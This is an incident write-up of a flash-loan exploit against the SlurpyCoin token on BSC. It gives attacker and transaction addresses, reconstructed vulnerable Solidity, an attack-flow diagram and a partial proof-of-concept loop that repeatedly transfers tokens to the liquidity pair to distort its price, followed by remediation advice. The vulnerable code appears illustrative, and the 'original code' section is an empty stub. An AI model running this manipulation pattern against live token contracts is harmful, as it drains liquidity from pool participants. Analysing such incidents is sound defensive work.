# SlurpyCoin — Transfer Fee Loop Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-12-19 |
| **Protocol** | SlurpyCoin |
| **Chain** | BSC |
| **Loss** | ~3,000 USD |
| **Attacker** | [0x132d9bbd](https://bscscan.com/address/0x132d9bbdbe718365af6cc9e43bac109a9a53b138) |
| **Attack Tx** | [0x6c729ee7](https://bscscan.com/tx/0x6c729ee778332244de099ba0cb68808fcd7be4a667303fcdf2f54dd4b3d29051) |
| **Vulnerable Contract** | [0x72c114A1](https://bscscan.com/address/0x72c114A1A4abC65BE2Be3E356eEde296Dbb8ba4c) |
| **Root Cause** | SlurpyCoin's `_transfer()` triggers BuyOrSell logic on direct transfers to the WBNB/SLURPY LP — repeated calls enable price manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/SlurpyCoin_exp.sol) |

---
## 1. Vulnerability Overview

SlurpyCoin's `_transfer()` function executed internal BuyOrSell logic whenever the transfer destination was an LP pool. The attacker borrowed 40 WBNB via a DODO flash loan, then ran 16 buy-loop iterations with 15 small-transfer sub-iterations per buy, repeatedly triggering the fee mechanism. This distorted the LP's price ratio and allowed the attacker to realize an arbitrage profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ SlurpyCoin: BuyOrSell triggered on LP transfer inside _transfer
contract SlurpyCoin {
    function _transfer(address from, address to, uint256 amount) internal override {
        if (to == pair || from == pair) {
            // ❌ BuyOrSell logic executed on every LP pool transfer
            _handleBuyOrSell(from, to, amount);
        }
        super._transfer(from, to, amount);
    }

    function _handleBuyOrSell(address from, address to, uint256 amount) internal {
        // ❌ Fee accumulation or price distortion via repeated calls
        // ❌ Calculation based on LP reserves — manipulable
        uint256 swapAmount = calculateSwap(amount);
        if (swapAmount > threshold) {
            _swapAndLiquify(swapAmount);  // Add liquidity to LP
        }
    }
}

// ✅ Fix:
// Limit the number of BuyOrSell calls within a single transaction
// Use a bool inSwap guard variable to prevent recursion
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: SlurpyCoin_decompiled.sol
contract SlurpyCoin {
    function transfer(address p0, uint256 p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow

```
Attacker (0x132d9bbd)
  │
  ├─[1]─▶ DODO.flashLoan(40 WBNB, 0, this, 0x00)
  │
  ├─[2]─▶ DPPFlashLoanCall callback:
  │         WBNB.approve(PANCAKE_ROUTER, max)
  │
  │         Outer loop ×16:
  │             path: WBNB → SLURPY
  │             router.swapTokensForExactTokens(1,300,000 SLURPY, ...)
  │             └─ BuyOrSell triggered on purchase
  │
  │             Inner loop ×15:
  │                 SLURPY.transfer(pair, 100,000 SLURPY)
  │                 └─ Direct LP transfer → BuyOrSell triggered repeatedly
  │                 LP reserve progressively distorted
  │
  ├─[3]─▶ Sell SLURPY → WBNB (profit at distorted price)
  │
  ├─[4]─▶ Repay DODO 40 WBNB
  │
  └─[5]─▶ ~3,000 USD net profit
```

## 4. PoC Code

```solidity
function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
    IERC20 wbnb = IERC20(WBNB_ADDR);
    IERC20 slurpy = IERC20(SLURPY_ADDR);

    wbnb.approve(PANCAKE_ROUTER, type(uint256).max);
    IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));
    address[] memory path = new address[](2);
    path[0] = WBNB_ADDR;
    path[1] = SLURPY_ADDR;

    // ❌ 16 * 15 = 240 BuyOrSell triggers
    uint256 amountOut = 1_300_000 ether;
    for (uint256 i = 0; i < 16; i++) {
        uint256[] memory amounts = router.getAmountsIn(amountOut, path);
        router.swapTokensForExactTokens(amountOut, amounts[0], path, address(this), block.timestamp);

        for (uint256 j = 0; j < 15; j++) {
            uint256 amount = 100_000 ether;
            // Direct transfer to LP → triggers BuyOrSell
            slurpy.transfer(/* pair address */, amount);
        }
    }

    // Sell SLURPY → WBNB
    // ...

    // Repay flash loan
    wbnb.transfer(DODO_ADDR, baseAmount);
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Vulnerability |
| **Attack Vector** | Flash loan + repeated `_transfer` BuyOrSell manipulation |
| **CWE** | CWE-799: Improper Control of Interaction Frequency |
| **DASP** | Business Logic Vulnerability |
| **Severity** | Low–Medium |

## 6. Remediation Recommendations

1. **inSwap guard**: Prevent re-entrant and repeated calls during BuyOrSell/swapAndLiquify execution
2. **Call count cap**: Limit the number of BuyOrSell executions within a single block
3. **Direct LP transfer detection**: Separate handling for direct `transfer` calls to the LP pool
4. **Fee accumulation**: Process fees only upon reaching a threshold rather than immediately on each transfer

## 7. Lessons Learned

- Any logic in a token's `_transfer()` that specially handles LP-bound transfers is exposed to repeated-call attacks.
- A single `inSwap` boolean guard can prevent the majority of such loop-based attack patterns.
- Even a small loss (~3,000 USD) using the same pattern applied to a higher-liquidity pool can be catastrophic.